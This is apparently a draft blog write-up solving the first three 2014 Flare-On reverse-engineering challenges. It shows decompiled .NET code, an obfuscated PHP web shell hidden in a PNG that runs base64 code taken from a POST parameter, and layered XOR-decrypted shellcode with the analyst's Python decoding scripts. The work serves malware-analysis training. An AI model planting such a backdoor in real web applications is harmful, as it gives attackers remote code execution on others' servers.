Title: Flare-On I
Date: 2022-06-04T15:28:16.000Z
Status: Draft

<h2 id="sources">Sources</h2><p>You can download the relevant files on this page: <a href="https://github.com/fareedfauzi/Flare-On-Challenges/tree/master/Challenges/2014/Flare-on%201">https://github.com/fareedfauzi/Flare-On-Challenges/tree/master/Challenges/2014/Flare-on 1</a>.</p><h3 id="challenge-01">Challenge 01</h3><p>Hashes of the archive (<code>C1.zip</code>) containing the files of the challenge:</p><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Hash</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr>
<td>MD5</td>
<td>7094c69959f626f8078145ab75abbbd0</td>
</tr>
<tr>
<td>SHA1</td>
<td>0e5895e65fe0f50275047bfb033ed272728ad4eb</td>
</tr>
<tr>
<td>SHA256</td>
<td>038e9ad33a0529337b0b0c30e37ae92787d0f0fb784e4c41cf2f36b020a5542e</td>
</tr>
</tbody>
</table><!--kg-card-end: html--><p>Once you extract from the <em>Win32 Cabinet Self-Extractor</em> (<code>C1.exe</code>), you'll find yourself with a Windows executable written in <code>.NET</code>.</p><p>Opening the binary with <code>dnSpy</code>, I noticed the following function:</p><pre><code class="language-cs">private void btnDecode_Click(object sender, EventArgs e)
{
    this.pbRoge.Image = Resources.bob_roge;
    byte[] dat_secret = Resources.dat_secret;
    string text = "";
    foreach (byte b in dat_secret)
    {
        text += (char)((b &gt;&gt; 4 | ((int)b &lt;&lt; 4 &amp; 240)) ^ 41);
    }
    text += "\0";
    string text2 = "";
    for (int j = 0; j &lt; text.Length; j += 2)
    {
        text2 += text[j + 1];
        text2 += text[j];
    }
    string text3 = "";
    for (int k = 0; k &lt; text2.Length; k++)
    {
        char c = text2[k];
        text3 += (char)((byte)text2[k] ^ 102);
    }
    this.lbl_title.Text = text3;
}
</code></pre><p>As you may infer from this code, the function is applied to a button of a GUI program. When the user clicks on the button, this function <code>btnDecode_Click</code> is executed.</p><p>The most interesting part of the code is the following:</p><pre><code class="language-cs">byte[] dat_secret = Resources.dat_secret;
string text = "";

foreach (byte b in dat_secret)
{
    text += (char)((b &gt;&gt; 4 | ((int)b &lt;&lt; 4 &amp; 240)) ^ 41);
}
</code></pre><p>It seems to retrieve a resource (from the <code>.rsrc</code> section) and then performs some bitwise operations on each byte of the resource data.</p><p>There are two ways to get the flag for this challenge:</p><ul><li>debugging the application (put a breakpoint at the beginning of the function <code>btnDecode_Click</code> and start the application)</li><li>writing a small script to decode the value</li></ul><p>I used the first approach, since it's easier and faster. The flag should be the following: <code>3rmahg3rd.b0b.d0ge@flare-on.com</code>.</p><p>However, I also wanted to test whether I could decode it manually. To retrieve the resource, you can use <code>dnSpy</code>:</p><ul><li>go to <code>Resources</code></li><li>right-click on <em>rev_challenge_1.dat_secret.encode</em></li><li>select <em>Show in Hex editor</em></li><li><em>Ctr-C</em> to copy the hex bytes</li></ul><pre><code class="language-py">encoded = "A1B5448414E4A1B5D470B491B470D491E4C496F45484B5C440647470A46444"
encoded_bytes = bytearray.fromhex(encoded)

decoded_list = [chr((b &gt;&gt; 4 | (b &lt;&lt; 4 &amp; 240)) ^ 41) for b in encoded_bytes]
print("".join(decoded_list))
# 3rmahg3rd.b0b.d0ge@flare-on.com
</code></pre><p>I successfully managed to decode it manually!</p><h3 id="challenge-02">Challenge 02</h3><p>Hashes of the archive (<code>C2.zip</code>) containing the files of the challenge:</p><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Hash</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr>
<td>MD5</td>
<td>74ea6bd7a2e19cfd6096614d7d9e8e0f</td>
</tr>
<tr>
<td>SHA1</td>
<td>32b08a345a4246526e8ecd73cacb8ceef3c32e9e</td>
</tr>
<tr>
<td>SHA256</td>
<td>407c11647b9c58f41daba5a6b85f04ac2a0c31bab9eefe3362c2805329a59bd1</td>
</tr>
</tbody>
</table><!--kg-card-end: html--><p>I had some problems extracting the files from the archive <code>C2.zip</code>, due the <code>unzip</code> not supporting the compression algorithm <em>PK 5.1</em>. In the end, I managed to extract it this way:</p><pre><code class="language-bash"># password: malware
7x x C2.zip -ochall_02
</code></pre><p>Inside, there are two files:</p><pre><code class="language-txt">.
├── home.html
└── img
    └── flare-on.png
</code></pre><p>While the HTML file doesn't contain anything useful, the image <code>flare-on.png</code> contains some PHP code, while still being a valid image!</p><p>If you were to run <code>strings</code> on the latter, you would find this code:</p><pre><code class="language-php">&lt;?php

$terms = array("M", "Z", "]", "p", "\\", "w", "f", "1", "v", "&lt;", "a", "Q", "z", " ", "s", "m", "+", "E", "D", "g", "W", "\"", "q", "y", "T", "V", "n", "S", "X", ")", "9", "C", "P", "r", "&amp;", "\'", "!", "x", "G", ":", "2", "~", "O", "h", "u", "U", "@", ";", "H", "3", "F", "6", "b", "L", "&gt;", "^", ",", ".", "l", "$", "d", "`", "%", "N", "*", "[", "0", "}", "J", "-", "5", "_", "A", "=", "{", "k", "o", "7", "#", "i", "I", "Y", "(", "j", "/", "?", "K", "c", "B", "t", "R", "4", "8", "e", "|");

$order = array(59, 71, 73, 13, 35, 10, 20, 81, 76, 10, 28, 63, 12, 1, 28, 11, 76, 68, 50, 30, 11, 24, 7, 63, 45, 20, 23, 68, 87, 42, 24, 60, 87, 63, 18, 58, 87, 63, 18, 58, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 17, 37, 63, 58, 37, 91, 63, 83, 43, 87, 42, 24, 60, 87, 93, 18, 87, 66, 28, 48, 19, 66, 63, 50, 37, 91, 63, 17, 1, 87, 93, 18, 45, 66, 28, 48, 19, 40, 11, 25, 5, 70, 63, 7, 37, 91, 63, 12, 1, 87, 93, 18, 81, 37, 28, 48, 19, 12, 63, 25, 37, 91, 63, 83, 63, 87, 93, 18, 87, 23, 28, 18, 75, 49, 28, 48, 19, 49, 0, 50, 37, 91, 63, 18, 50, 87, 42, 18, 90, 87, 93, 18, 81, 40, 28, 48, 19, 40, 11, 7, 5, 70, 63, 7, 37, 91, 63, 12, 68, 87, 93, 18, 81, 7, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 18, 17, 37, 0, 50, 5, 40, 42, 50, 5, 49, 42, 25, 5, 91, 63, 50, 5, 70, 42, 25, 37, 91, 63, 75, 1, 87, 93, 18, 1, 17, 80, 58, 66, 3, 86, 27, 88, 77, 80, 38, 25, 40, 81, 20, 5, 76, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 7, 88, 32, 45, 7, 90, 52, 80, 58, 5, 70, 63, 7, 5, 66, 42, 25, 37, 91, 0, 12, 50, 87, 63, 83, 43, 87, 93, 18, 90, 38, 28, 48, 19, 7, 63, 50, 5, 37, 0, 24, 1, 87, 0, 24, 72, 66, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 1, 87, 93, 18, 11, 66, 28, 18, 87, 70, 28, 48, 19, 7, 63, 50, 5, 37, 0, 18, 1, 87, 42, 24, 60, 87, 0, 24, 17, 91, 28, 18, 75, 49, 28, 18, 45, 12, 28, 48, 19, 40, 0, 7, 5, 37, 0, 24, 90, 87, 93, 18, 81, 37, 28, 48, 19, 49, 0, 50, 5, 40, 63, 25, 5, 91, 63, 50, 5, 37, 0, 18, 68, 87, 93, 18, 1, 18, 28, 48, 19, 40, 0, 25, 5, 37, 0, 24, 90, 87, 0, 24, 72, 37, 28, 48, 19, 66, 63, 50, 5, 40, 63, 25, 37, 91, 63, 24, 63, 87, 63, 12, 68, 87, 0, 24, 17, 37, 28, 48, 19, 40, 90, 25, 37, 91, 63, 18, 90, 87, 93, 18, 90, 38, 28, 18, 19, 66, 28, 18, 75, 70, 28, 48, 19, 40, 90, 58, 37, 91, 63, 75, 11, 79, 28, 27, 75, 3, 42, 23, 88, 30, 35, 47, 59, 71, 71, 73, 35, 68, 38, 63, 8, 1, 38, 45, 30, 81, 15, 50, 12, 1, 24, 81, 66, 28, 40, 90, 58, 81, 40, 30, 75, 1, 27, 19, 75, 28, 23, 75, 77, 1, 28, 1, 43, 52, 31, 19, 75, 81, 40, 30, 75, 1, 27, 75, 77, 35, 47, 59, 71, 71, 71, 73, 21, 4, 37, 51, 40, 4, 7, 91, 7, 4, 37, 77, 49, 4, 7, 91, 70, 4, 37, 49, 51, 4, 51, 91, 4, 37, 70, 6, 4, 7, 91, 91, 4, 37, 51, 70, 4, 7, 91, 49, 4, 37, 51, 6, 4, 7, 91, 91, 4, 37, 51, 70, 21, 47, 93, 8, 10, 58, 82, 59, 71, 71, 71, 82, 59, 71, 71, 29, 29, 47);

$do_me = "";
for ($i = 0; $i &lt; count($order); $i++)
{
    $do_me = $do_me.$terms[$order[$i]];
}

eval($do_me);
?&gt;
</code></pre><p>To de-obfuscate the code, I simply replaced the <code>eval</code> function with an <code>echo</code>:</p><pre><code class="language-php">$_ = 'aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9';
$__ = 'JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7';
$___ = "\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65";

eval($___($__));
</code></pre><p>This one is a little more complicated. First, the variable <code>$___</code> is the string <code>base64_decode</code> encoded to hex/decimal notation.</p><p>Once again, replacing <code>eval</code> with <code>echo</code> reveals the next block of code:</p><pre><code class="language-php">$code = base64_decode($_);
eval($code);
</code></pre><p>Once more:</p><pre><code class="language-php">if(isset($_POST["\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D"]))
{
    eval(base64_decode($_POST["\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D"]));
}
</code></pre><p>To decode the two strings, I used some python code:</p><pre><code class="language-py">l = [97, 49, 49, 68, 0x4F, 84, 116, 0x68, 97, 0x74, 0x44, 0x4F, 0x54, 0x6A, 97, 0x76, 0x61, 0x35, 0x63, 0x72, 97, 0x70, 0x41, 84, 0x66, 0x6C, 97, 0x72, 0x65, 0x44, 65, 0x53, 72, 111, 110, 68, 79, 84, 99, 0x6F, 0x6D]
"".join([chr(x) for x in l])
# a11DOTthatDOTjava5crapATflareDASHonDOTcom

m = [97, 49, 0x31, 68, 0x4F, 0x54, 116, 104, 0x61, 116, 0x44, 79, 0x54, 106, 97, 118, 97, 53, 0x63, 114, 0x61, 0x70, 65, 84, 102, 0x6C, 0x61, 114, 101, 0x44, 65, 0x53, 72, 111, 0x6E, 0x44, 0x4F, 84, 99, 0x6F, 0x6D]
"".join([chr(x) for x in m])
# a11DOTthatDOTjava5crapATflareDASHonDOTcom
</code></pre><p>In both cases, the resulting decoded string is <em>a11DOTthatDOTjava5crapATflareDASHonDOTcom</em>, so the flag should be the following:</p><pre><code class="language-txt">a11.that.java5crap@flare-on.com
</code></pre><h3 id="challenge-03">Challenge 03</h3><p>Hashes of the archive (<code>C3.zip</code>) containing the files of the challenge:</p><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Hash</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr>
<td>MD5</td>
<td>84d6581b485a8580092a20bc614bb660</td>
</tr>
<tr>
<td>SHA1</td>
<td>06ea4adb5c22b46c8751402cd20ffd73ce72dd4b</td>
</tr>
<tr>
<td>SHA256</td>
<td>e81a25edd426d9cdcefe5ca06d8ddb21e248100e2f1150dea5834f420b64652b</td>
</tr>
</tbody>
</table><!--kg-card-end: html--><p>Once extracted, I found a strange file named <code>such_evil</code>:</p><pre><code class="language-bash">file such_evil
# such_evil:          PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows
</code></pre><p>According to its properties, it's a Windows executable compiled for 32-bit <code>x86</code> systems.</p><p>As it could perform some malicious operations (hypothetical case), I chose to start by reversing the binary.</p><p>Using the plugin <a href="https://github.com/wargio/r2dec-js">r2dec-js</a> for <code>radare2</code> I managed to decompile some of the code executed after the entrypoint of the binary:</p><pre><code class="language-cpp">#include &lt;stdint.h&gt;
 
uint32_t entry0 (void) {
    int32_t var_2ch;
    int32_t var_28h;
    int32_t var_24h;
    int32_t var_20h;
    int32_t var_1ch;
    int32_t var_18h;
    
    fcn_004025d1 (ebp - 0x18, ebp);

    eax = 0;
    *((ebp - 0x2c)) = eax;
    eax = 0x30000;
    eax = 0x10000;
    _controlfp (eax, eax);

    eax = 1;
    _set_app_type (eax);

    eax = 0;
    _getmainargs (ebp - 0x1c, ebp - 0x20, ebp - 0x24, eax, ebp - 0x2c);

    eax = *((ebp - 0x24));
    eax = *((ebp - 0x20));
    eax = *((ebp - 0x1c));
    eax = fcn_00401000 ();

    *((ebp - 0x28)) = eax;
    eax = *((ebp - 0x28));
    exit (eax);
    
    return eax;
}
</code></pre><p>What caught my interest isn't the first function (<code>fcn_004025d1</code>), but the last one: <code>fcn_00401000</code>.</p><p>Bases on the following decompiled instructions, it seems to fill a memory area with hard-coded bytes:</p><pre><code class="language-nasm">┌ 5289: fcn.00401000 ();
│           ; var int32_t var_201h @ ebp-0x201
│           ; var int32_t var_200h @ ebp-0x200
│           ; var int32_t var_1ffh @ ebp-0x1ff
│           ; var int32_t var_1feh @ ebp-0x1fe
│           ; var int32_t var_1fdh @ ebp-0x1fd
│           ; var int32_t var_1fch @ ebp-0x1fc
│           ; var int32_t var_1fbh @ ebp-0x1fb
│           ; var int32_t var_1fah @ ebp-0x1fa
│           ; var int32_t var_1f9h @ ebp-0x1f9
│           ; var int32_t var_1f8h @ ebp-0x1f8
│           ; var int32_t var_1f7h @ ebp-0x1f7
│           ; var int32_t var_1f6h @ ebp-0x1f6
|
|           ; [omissis]
|
│           0x00401000      55             push ebp                    ; [00] -r-x section size 8192 named .text
│           0x00401001      89e5           mov ebp, esp
│           0x00401003      81ec04020000   sub esp, 0x204
│           0x00401009      90             nop
│           0x0040100a      b8e8000000     mov eax, 0xe8               ; 232
│           0x0040100f      8885fffdffff   mov byte [var_201h], al
│           0x00401015      b800000000     mov eax, 0
│           0x0040101a      888500feffff   mov byte [var_200h], al
│           0x00401020      b800000000     mov eax, 0
│           0x00401025      888501feffff   mov byte [var_1ffh], al
│           0x0040102b      b800000000     mov eax, 0
│           0x00401030      888502feffff   mov byte [var_1feh], al
│           0x00401036      b800000000     mov eax, 0
│           0x0040103b      888503feffff   mov byte [var_1fdh], al
│           0x00401041      b88b000000     mov eax, 0x8b               ; 139
│           0x00401046      888504feffff   mov byte [var_1fch], al
│           0x0040104c      b834000000     mov eax, 0x34               ; '4' ; 52
│           0x00401051      888505feffff   mov byte [var_1fbh], al
│           0x00401057      b824000000     mov eax, 0x24               ; '$' ; 36
│           0x0040105c      888506feffff   mov byte [var_1fah], al
│           0x00401062      b883000000     mov eax, 0x83               ; 131
│           0x00401067      888507feffff   mov byte [var_1f9h], al
|
|           ; [omissis]
|
│           0x00402462      8845f9         mov byte [var_7h], al
│           0x00402465      b880000000     mov eax, 0x80               ; 128
│           0x0040246a      8845fa         mov byte [var_6h], al
│           0x0040246d      b832000000     mov eax, 0x32               ; '2' ; 50
│           0x00402472      8845fb         mov byte [var_5h], al
│           0x00402475      b81c000000     mov eax, 0x1c               ; 28
│           0x0040247a      8845fc         mov byte [var_4h], al
│           0x0040247d      b895000000     mov eax, 0x95               ; 149
│           0x00402482      8845fd         mov byte [var_3h], al
│           0x00402485      b8c9000000     mov eax, 0xc9               ; 201
│           0x0040248a      8845fe         mov byte [var_2h], al
│           0x0040248d      b800000000     mov eax, 0
│           0x00402492      8845ff         mov byte [var_1h], al
│           0x00402495      8d85fffdffff   lea eax, [var_201h]
│           0x0040249b      ffd0           call eax
</code></pre><p>Besides the function prologue, and a <code>nop</code> instruction, it starts doing the following:</p><ol><li>copy the byte <code>0xe8</code> to the variable <code>var_201h</code>, whose address is equal to <strong>$ebp - 0x201</strong></li><li>copy <code>0x00</code> to $ebp-0x200</li><li>copy <code>0x00</code> to $ebp-0x1ff</li><li>copy <code>0x00</code> to $ebp-0x1fe</li><li>copy <code>0x00</code> to $ebp-0x1fd</li><li>copy <code>0x00</code> to $ebp-0x1fc</li><li>copy <code>0x8b</code> to $ebp-0x1fb</li></ol><p>At the end of the function, the program loads the address of the local variable <code>var_201h</code>, and after that it jumps to that address, by means of the <code>CALL</code> instruction.</p><p>So far, this program seems to copy some bytes, supposedly shellcode, to the following address range:</p><pre><code class="language-txt">+--- EBP - 0x201 ---+
|--- EBP - 0x200 ---|
|--- EBP - 0x1ff ---|
|--- EBP - 0x1fe ---|
|------ ... --------|
|------ ... --------|
|--- EBP - 0x003 ---|
|--- EBP - 0x002 ---|
+--- EBP - 0x001 ---+
</code></pre><p>The firs byte starts at the address <code>$EBP-0x201</code>, and the last on is stored at <code>$EBP-1</code>.</p><p>To extract this shellcode, I simply used some <em>bash magic</em>:</p><pre><code class="language-bash">xxd -p such_evil | tr -d '\n' | grep -oE 'b8[a-f0-9]{2}000000' | tail +2 | head -n 513 | sed -E 's/b8(..)000000/\1/g' | tr -d '\n' | xxd -r -p &gt; shellcode.bin
</code></pre><p>Once I extracted the shellcode, I could use <code>radare2</code> to analyze the assembly instructions:</p><pre><code class="language-nasm">0x00000000      e800000000     call 5
0x00000005      8b3424         mov esi, dword [esp]
0x00000008      83c61c         add esi, 0x1c
0x0000000b      b9df010000     mov ecx, 0x1df              ; 479
0x00000010      83f900         cmp ecx, 0
0x00000013      7407           je 0x1c
0x00000015      803666         xor byte [esi], 0x66        ; [0x66:1]=110
0x00000018      46             inc esi
0x00000019      49             dec ecx
0x0000001a      ebf4           jmp 0x10
0x0000001c      e910000000     jmp 0x31
0x00000021      07             pop es
0x00000022      0802           or byte [edx], al
0x00000024      46             inc esi
0x00000025      1509460f12     adc eax, 0x120f4609
0x0000002a      46             inc esi
0x0000002b      0403           add al, 3
0x0000002d      010f           add dword [edi], ecx
0x0000002f      08150e131566   or byte [0x6615130e], dl    ; [0x6615130e:1]=255
0x00000035      660e           push cs
</code></pre><p>The instructions up to the offset <code>0x1c</code> can be converted to the following pseudo-code:</p><pre><code class="language-cpp">#include &lt;stdint.h&gt;
 
void fcn_00000000 () {

    // after the two instructions, esi = 0x21
    esi = *(esp);
    esi += 0x1c;

    ecx = 0x1df;

    do
    {
        if (ecx == 0)
        {
            goto shellcode;
        }

        *(esi) ^= 0x66;
        esi += 1;
        ecx -= 1;
    } while (1);

shellcode:
    return void (*0x31)() ();
}
</code></pre><p>As you have noticed, the function loops <code>0x1df</code> times in order to <code>XOR</code> the bytes from the address <code>0x21</code> onwards, meaning until the byte <code>0x200</code>.</p><p>To replicate the decryption process, I used the following python script (alternative to <code>cyberchef</code>):</p><pre><code class="language-py">with open("shellcode.bin", 'rb') as f:
    data = f.read()

    encrypted_shellcode = data[0x21:0x21 + 0x1df]

    decrypted_shellcode = bytearray()
    for enc_byte in encrypted_shellcode:
        decrypted_shellcode.append(enc_byte ^ 0x66)
    
    with open("shellcode2.bin", "wb") as f2:
        f2.write(decrypted_shellcode)
</code></pre><p>I found the string <em>and so it begins</em> at the beginning of the decrypted shellcode, which meant I was on the right track. Moreover, it meant the initial bytes must be skipped (being a string), and I needed to find the correct jump:</p><pre><code class="language-cpp">shellcode:
    return void (*0x31)() ();
</code></pre><p>Looking back, I remembered the call to the offset <code>0x31</code>, exactly <code>0x10</code> bytes after the beginning of the decrypted data. Coincidentally, the previous string is 10-characters long, so the real instructions start right after the letter <code>s</code> of <code>begins</code>.</p><p>Therefore, I tweaked the script a bit in order to obtain the real shellcode:</p><pre><code class="language-py"># [omissis]
    with open("shellcode2.bin", "wb") as f2:
        f2.write(decrypted_shellcode[0x10:])
</code></pre><p>Follows the disassembly of the decrypted shellcode:</p><pre><code class="language-nasm">; set EBX to point to the string "nopasaurus"
0x00000000      6875730000     push 0x7375                 ; 'us'
0x00000005      6873617572     push 0x72756173             ; 'saur'
0x0000000a      686e6f7061     push 0x61706f6e             ; 'nopa'
0x0000000f      89e3           mov ebx, esp

; set ESI to offset 0x43
0x00000011      e800000000     call 0x16
0x00000016      8b3424         mov esi, dword [esp]
0x00000019      83c62d         add esi, 0x2d

; set ECX = 0x43 + 0x18c = 0x1cf
0x0000001c      89f1           mov ecx, esi
0x0000001e      81c18c010000   add ecx, 0x18c              ; 396

; set EAX to point to the byte following the XOR key
0x00000024      89d8           mov eax, ebx
0x00000026      83c00a         add eax, 0xa

; if EBX is equal to EAX, restore EBX to point to the start
; of the the XOR key
0x00000029      39d8           cmp eax, ebx
0x0000002b      7505           jne 0x32
0x0000002d      89e3           mov ebx, esp
0x0000002f      83c304         add ebx, 4

; check if we finished looping
0x00000032      39ce           cmp esi, ecx
0x00000034      7408           je 0x3e

; decrypt the encrypted byte through XOR
0x00000036      8a13           mov dl, byte [ebx]
0x00000038      3016           xor byte [esi], dl

; step to the next encrypted byte
0x0000003a      43             inc ebx
0x0000003b      46             inc esi
0x0000003c      ebeb           jmp 0x29
0x0000003e      e931000000     jmp 0x74
</code></pre><p>The instructions above can be converted to the following pseudo-code:</p><pre><code class="language-cpp">int32_t fcn_00000000 (void)
{
    esi = 0x16;
    esi += 0x2d;

    ecx = esi;
    ecx += 0x18c;

    ebx = "nopasaurus";
    esp = &amp;ebx;
    eax = &amp;ebx;
    eax += 0xa;
    
    do
    {
        if (eax == ebx)
        {
            ebx = esp;
            ebx += 4;
        }

        if (esi == ecx)
        {
            goto shellcode;
        }

        dl = *(ebx);
        *(esi) ^= dl;

        ebx++;
        esi++;
    } while (1);
    
    // [omissis]
}
</code></pre><p>In brief, the program loops over the string <code>nopasaurus</code> in order to <em>XOR-decrypt</em> the shellcode stored in the range <code>0x43</code> to <code>0x1cf</code> (0x43 + 0x18c).</p><p>To decrypt it, I used once again a script:</p><pre><code class="language-py">xor_key = "nopasaurus"

with open("shellcode2.bin", 'rb') as f:
    data = f.read()

    encrypted_shellcode = data[0x43:0x43 + 0x18c]
    decrypted_shellcode = bytearray()

    for index, enc_byte in enumerate(encrypted_shellcode):
        xor_byte = xor_key[index % len(xor_key)]
        decrypted_shellcode.append(enc_byte ^ ord(xor_byte))
    
    with open("shellcode3.bin", "wb") as f2:
        f2.write(decrypted_shellcode)
</code></pre><p>Using this script, I managed to decrypt shellcode, and I also found a string left by the authors:</p><blockquote>get ready to get nop'ed so damn hard in the paint</blockquote><p>To get the real shellcode though, I had to calculate the offset based on the disassembly I got from radare.</p><pre><code class="language-py"># [omissis]
    with open("shellcode3.bin", "wb") as f2:
        f2.write(decrypted_shellcode[0x74 - 0x43:])
</code></pre><p>Follows the decrypted shellcode:</p><pre><code class="language-nasm">; set ESI = 0x5 + 0x1e = 0x23
0x00000000      e800000000     call 5
0x00000005      8b3424         mov esi, dword [esp]
0x00000008      83c61e         add esi, 0x1e

; set ECX = 0x138
0x0000000b      b938010000     mov ecx, 0x138              ; 312
0x00000010      83f900         cmp ecx, 0
0x00000013      7e0e           jle 0x23
0x00000015      8136624f6c47   xor dword [esi], 0x476c4f62 ; [0x476c4f62:4]=-1
0x0000001b      83c604         add esi, 4
0x0000001e      83e904         sub ecx, 4
0x00000021      ebed           jmp 0x10
0x00000023      ef             out dx, eax
</code></pre><p>This one is smaller, although it's becoming repetive: once again it uses the xor operation to decode some shellcode, however this time it does so by xoring 4 bytes at a time with the XOR key <code>0x476c4f62</code> (ASCII: <em>GlOb</em>).</p><pre><code class="language-py">import struct

xor_key_bytes = bytearray.fromhex("476c4f62")
xor_key_unpacked = struct.unpack("&gt;i", xor_key_bytes)[0]

with open("shellcode3.bin", 'rb') as f:
    encrypted_shellcode = f.read()

    with open("shellcode4.bin", "wb") as f2:
        for x in range(0x23, 0x23 + 0x138, 4):
            dword_unpacked = struct.unpack("&lt;i", encrypted_shellcode[x:x+4])
            decoded_dword = dword_unpacked[0] ^ xor_key_unpacked
            decoded_dword_packed = struct.pack("&lt;i", decoded_dword)

            f2.write(decoded_dword_packed)
</code></pre><p>The decrypted shellcode contains yet another decryption stub:</p><pre><code class="language-nasm">; useless instructions
0x00000000      8d8000000000   lea eax, [eax]
0x00000006      8d8000000000   lea eax, [eax]
0x0000000c      90             nop
0x0000000d      90             nop
0x0000000e      90             nop
0x0000000f      90             nop

; XOR key: "omg is it almost over?!?"
0x00000010      68723f213f     push 0x3f213f72             ; 'r?!?'
0x00000015      68206f7665     push 0x65766f20             ; ' ove'
0x0000001a      686d6f7374     push 0x74736f6d             ; 'most'
0x0000001f      687420616c     push 0x6c612074             ; 't al'
0x00000024      6869732069     push 0x69207369             ; 'is i'
0x00000029      686f6d6720     push 0x20676d6f             ; 'omg '
0x0000002e      89e3           mov ebx, esp

; set ESI to 0x35 + 0x2d = 0x62
0x00000030      e800000000     call 0x35
0x00000035      8b3424         mov esi, dword [esp]
0x00000038      83c62d         add esi, 0x2d

; set ECX to offset 0x62 + 0xd6 = 0x138
; decrypt bytes from offset 0x62 to offset 0x138
0x0000003b      89f1           mov ecx, esi
0x0000003d      81c1d6000000   add ecx, 0xd6               ; 214

; set EAX to EBX+18, i.e. the character following the end of the XOR key
0x00000043      89d8           mov eax, ebx
0x00000045      83c018         add eax, 0x18

; if EAX and EBX are equal, it means we have to go back
; to the start of the XOR key
0x00000048      39d8           cmp eax, ebx
0x0000004a      7505           jne 0x51

; restore EBX to point to the XOR key
0x0000004c      89e3           mov ebx, esp
0x0000004e      83c304         add ebx, 4

; if we finished decrypting, jump to offset 0x5d, i.e. 0x7f
0x00000051      39ce           cmp esi, ecx
0x00000053      7408           je 0x5d

; xor the encrypted byte with the current char. of the XOR key
0x00000055      8a13           mov dl, byte [ebx]
0x00000057      3016           xor byte [esi], dl

; increase the index of the XOR key
0x00000059      43             inc ebx

; go back to decryot the next char
0x0000005b      ebeb           jmp 0x48
0x0000005d      e91d000000     jmp 0x7f

; first encrypted byte
0x00000062      1c18           sbb al, 0x18
</code></pre><p>Using the script below, I successfully decrypted the encrypted shellcode:</p><pre><code class="language-py">xor_key_bytes = "omg is it almost over?!?"

with open("shellcode4.bin", 'rb') as f:
    encrypted_shellcode = f.read()[0x62:]

    with open("shellcode5.bin", "wb") as f2:
        for x in range(0, 0x138 - 0x62):
            decrypted_byte = encrypted_shellcode[x] ^ ord(xor_key_bytes[x % len(xor_key_bytes)])

            f2.write(chr(decrypted_byte).encode())
</code></pre><p>As before, the first bytes aren't assembly instructions, but a string left by the author of the challenge:</p><pre><code class="language-bash">xxd shellcode5.bin          
# 00000000: 7375 6368 2e35 6833 3131 3031 3031 3031  such.5h311010101
# 00000010: 4066 6c61 7265 2d6f 6e2e 636f 6d68 6e74  @flare-on.comhnt
</code></pre><p>As you can clearly see, the flag for this challenge is <code>such.5h311010101@flare-on.co</code>.</p><p>The rest of the shellcode prints the message <em>aaaaaand i'm spent</em>:</p><pre><code class="language-nasm">; set EBX to point to the string "aaaaaand i'm spent"
; it's the XOR key
0x00000000      686e740000     push 0x746e                 ; 'nt'
0x00000005      6820737065     push 0x65707320             ; ' spe'
0x0000000a      682069276d     push 0x6d276920             ; ' i'm'
0x0000000f      6861616e64     push 0x646e6161             ; 'aand'
0x00000014      6861616161     push 0x61616161             ; 'aaaa'
0x00000019      89e3           mov ebx, esp

; set ESI = 0x20 + 0x28 = 0x48
0x0000001b      e800000000     call 0x20
0x00000020      8b3424         mov esi, dword [esp]
0x00000023      83c628         add esi, 0x28               ; 40

; set ECX = 0x48 + 0x71 = 0xb9
0x00000026      89f1           mov ecx, esi
0x00000028      81c171000000   add ecx, 0x71               ; 113

; set EAX to point to the character following the XOR key
0x0000002e      89d8           mov eax, ebx
0x00000030      83c012         add eax, 0x12               ; 18

; if EAX is equal to EBX go back to the first char. of
; the XOR key
0x00000033      39d8           cmp eax, ebx
0x00000035      7505           jne 0x3c
0x00000037      89e3           mov ebx, esp
0x00000039      83c304         add ebx, 4

; if it's finished looping, jump to 0x48
0x0000003c      39ce           cmp esi, ecx
0x0000003e      7408           je 0x48

; xor the encrypted byte with the char. of the XOR key
0x00000040      8a13           mov dl, byte [ebx]
0x00000042      3016           xor byte [esi], dl

; step to the next encrypted byte and to the next char
; of the XOR key
0x00000044      43             inc ebx
0x00000045      46             inc esi

; go back to decryot the next encrypted byte
0x00000046      ebeb           jmp 0x33

; encrypted bytes (garbage)
0x00000048      50             push eax
0x00000049      b3d3           mov bl, 0xd3                ; 211
</code></pre><p>To decrypt it:</p><pre><code class="language-py">xor_key_bytes = "aaaaaand i'm spent"

with open("shellcode5.bin", 'rb') as f:
    encrypted_shellcode = f.read()[0x48:]
    decrypted_shellcode = bytearray()

    for x in range(0, 0x71):
